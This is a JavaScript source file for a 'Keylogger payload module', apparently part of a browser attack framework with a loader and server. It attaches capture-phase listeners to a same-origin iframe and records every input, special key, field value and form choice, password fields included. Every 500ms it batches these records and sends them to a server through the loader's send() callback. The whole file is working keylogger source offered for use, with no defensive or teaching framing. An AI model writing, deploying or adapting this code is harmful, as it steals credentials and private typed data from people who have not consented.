/**
 * Keylogger payload module.
 * Captures keystrokes on the target page (same-origin iframe only).
 * Uses capture-phase listeners so all descendant elements are covered.
 * Events are batched every 500ms and sent via send("entries", { entries }).
 *
 * Cross-origin iframes are handled gracefully with try/catch — the listener
 * attachment is skipped and a warning is logged, matching the spider/domviewer pattern.
 */

let _send = null;
let _log = null;
let _iframe = null;
let _flushTimer = null;
let _pendingEntries = [];

const FLUSH_INTERVAL = 500;

/** Special/non-printable keys captured as key events (printable chars come via input events). */
const SPECIAL_KEYS = new Set([
  "Enter", "Tab", "Escape", "Backspace", "Delete",
  "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight",
  "Home", "End", "PageUp", "PageDown",
  "Insert", "CapsLock", "Pause", "PrintScreen", "ContextMenu",
]);

/**
 * Build a human-readable element descriptor for grouping entries.
 * Priority: id > name > type+placeholder > type > contenteditable > tagName
 * @param {Element} el
 * @returns {string}
 */
function getDescriptor(el) {
  const tag = el.tagName.toLowerCase();
  if (el.id) return `${tag}#${el.id}`;
  const name = el.getAttribute("name");
  if (name) return `${tag}[name=${name}]`;
  const type = el.getAttribute("type");
  const placeholder = el.getAttribute("placeholder");
  if (type && placeholder) return `${tag}[type=${type}][placeholder=${placeholder}]`;
  if (type) return `${tag}[type=${type}]`;
  if (el.getAttribute("contenteditable") !== null) return `${tag}[contenteditable]`;
  return tag;
}

/**
 * Get the element type string used for categorisation in the UI.
 * @param {Element} el
 * @returns {string}
 */
function getElementType(el) {
  const tag = el.tagName.toLowerCase();
  if (tag === "textarea") return "textarea";
  if (tag === "select") return "select";
  if (el.getAttribute("contenteditable") !== null) return "contenteditable";
  return (el.getAttribute("type") || "text").toLowerCase();
}

/**
 * Returns true if the key event represents a special/non-printable key or a
 * modifier combination. Single printable characters are skipped — they are
 * already covered by 'input' events.
 * @param {KeyboardEvent} e
 * @returns {boolean}
 */
function isSpecialKey(e) {
  if (e.ctrlKey || e.metaKey) return true;
  if (SPECIAL_KEYS.has(e.key)) return true;
  if (/^F\d+$/.test(e.key)) return true;
  return false;
}

/**
 * Format a KeyboardEvent as a human-readable combo string (e.g. "Ctrl+C").
 * @param {KeyboardEvent} e
 * @returns {string}
 */
function formatKeyCombo(e) {
  const parts = [];
  if (e.ctrlKey) parts.push("Ctrl");
  if (e.altKey) parts.push("Alt");
  if (e.shiftKey) parts.push("Shift");
  if (e.metaKey) parts.push("Meta");
  if (!parts.includes(e.key)) parts.push(e.key);
  return parts.join("+");
}

/**
 * Queue an entry for the next batch flush.
 */
function queueEntry(elementDescriptor, elementType, eventType, data, value) {
  _pendingEntries.push({
    elementDescriptor,
    elementType,
    eventType,
    data,
    value,
    timestamp: Date.now(),
  });
}

/**
 * Flush all pending entries to the server and clear the buffer.
 */
function flush() {
  if (!_send || _pendingEntries.length === 0) return;
  const entries = _pendingEntries.splice(0);
  _send("entries", { entries });
}

/** Capture-phase 'input' event: records typed characters and field values. */
function onInput(e) {
  // Deletion-type input events (Backspace, Delete, cut, drag-delete) carry
  // no inserted character data — the keystroke is already captured by onKeyDown.
  if (e.inputType && e.inputType.startsWith("delete")) return;

  const el = e.target;
  if (!el || !el.tagName) return;
  const tag = el.tagName.toLowerCase();
  const isContentEditable = el.getAttribute("contenteditable") !== null;
  if (!["input", "textarea"].includes(tag) && !isContentEditable) return;

  const descriptor = getDescriptor(el);
  const elementType = getElementType(el);
  const data = e.data || "";
  let value = "";
  try {
    value = isContentEditable ? (el.textContent || "") : (el.value || "");
  } catch (_) {}

  queueEntry(descriptor, elementType, "input", data, value);
}

/** Capture-phase 'keydown' event: records special keys and modifier combos. */
function onKeyDown(e) {
  const el = e.target;
  if (!el || !el.tagName) return;
  if (!isSpecialKey(e)) return;

  const tag = el.tagName.toLowerCase();
  const isContentEditable = el.getAttribute("contenteditable") !== null;
  if (!["input", "textarea"].includes(tag) && !isContentEditable) return;

  const descriptor = getDescriptor(el);
  const elementType = getElementType(el);
  const combo = formatKeyCombo(e);
  let value = "";
  try {
    value = isContentEditable ? (el.textContent || "") : (el.value || "");
  } catch (_) {}

  queueEntry(descriptor, elementType, "key", combo, value);
}

/** 'change' event: records select choices and checkbox/radio state. */
function onChange(e) {
  const el = e.target;
  if (!el || !el.tagName) return;
  const tag = el.tagName.toLowerCase();

  if (tag === "select") {
    const descriptor = getDescriptor(el);
    const selectedText = el.options[el.selectedIndex]?.text || el.value;
    queueEntry(descriptor, "select", "change", selectedText, el.value);
  } else if (tag === "input" && (el.type === "checkbox" || el.type === "radio")) {
    const descriptor = getDescriptor(el);
    const state = el.checked ? "checked" : "unchecked";
    queueEntry(descriptor, el.type, "change", state, el.value);
  }
}

/**
 * Attach event listeners to the iframe's document using capture phase.
 * Silently skips if the iframe is cross-origin.
 */
function attachListeners() {
  let doc;
  try {
    doc = _iframe.contentDocument;
  } catch (_) {
    if (_log) _log("warn", "Keylogger: iframe is cross-origin, cannot capture keystrokes");
    return;
  }
  if (!doc) return;

  doc.addEventListener("input", onInput, true);
  doc.addEventListener("keydown", onKeyDown, true);
  doc.addEventListener("change", onChange, true);
}

/** Detach listeners from the iframe's current document (if accessible). */
function detachListeners() {
  let doc;
  try {
    doc = _iframe && _iframe.contentDocument;
  } catch (_) {
    return;
  }
  if (!doc) return;
  doc.removeEventListener("input", onInput, true);
  doc.removeEventListener("keydown", onKeyDown, true);
  doc.removeEventListener("change", onChange, true);
}

function onIframeLoad() {
  attachListeners();
}

/**
 * Payload entry point. Called by the loader with the API context.
 * @param {object} params
 * @param {HTMLIFrameElement} params.iframe - The loader's iframe element
 * @param {Function} params.send - Send a text payload message to the server
 * @param {Function} params.log - Send a diagnostic log message to the server
 */
export function init({ iframe, send, log }) {
  _send = send;
  _log = log;
  _iframe = iframe;

  if (_log) _log("info", "Keylogger payload initialized");

  // Attach to the currently loaded iframe document
  attachListeners();

  // Re-attach on each iframe navigation
  _iframe.addEventListener("load", onIframeLoad);

  // Start periodic flush
  _flushTimer = setInterval(flush, FLUSH_INTERVAL);
}

/**
 * Clean up all state when the payload is unloaded.
 * Flushes any remaining buffered entries before tearing down.
 */
export function destroy() {
  flush();

  if (_flushTimer) {
    clearInterval(_flushTimer);
    _flushTimer = null;
  }

  if (_iframe) {
    _iframe.removeEventListener("load", onIframeLoad);
    detachListeners();
  }

  _send = null;
  _log = null;
  _iframe = null;
  _pendingEntries = [];
}
